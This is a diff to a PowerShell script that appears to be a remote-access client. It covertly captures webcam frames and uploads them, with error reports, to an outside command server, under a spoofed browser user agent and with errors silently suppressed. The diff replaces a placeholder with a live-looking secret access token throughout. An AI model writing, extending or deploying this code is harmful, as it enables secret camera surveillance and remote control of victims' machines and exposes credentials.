@@ -4,7 +4,7 @@
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 $Version = "3.1.2"
 $cfHost = "https://connect.aniketpandey.website"
-$cfToken = "CHANGE_ME_TO_A_SECRET"  # must match server.py TOKEN
+$cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
@@ -392,14 +392,14 @@ function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTas
 function UploadFrame([byte[]]`$data) {
     try {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
-        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET')
+        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782')
         `$s=`$r.GetRequestStream();`$s.Write(`$data,0,`$data.Length);`$s.Close();`$r.GetResponse().Close()
     } catch {}
 }
 function ShouldStop {
     try {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_signal?id=$clientId')
-        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET')
+        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0';`$r.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782')
         `$resp=`$r.GetResponse();`$val=(New-Object System.IO.StreamReader(`$resp.GetResponseStream())).ReadToEnd().Trim();`$resp.Close()
         return (`$val -eq 'stopstream' -or `$val -eq 'cancel')
     } catch { return `$false }
@@ -423,7 +423,7 @@ try {
     }
     try { `$device.Dispose() } catch {}
 } catch {
-    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','CHANGE_ME_TO_A_SECRET');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
+    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
 }
 "@
         try {
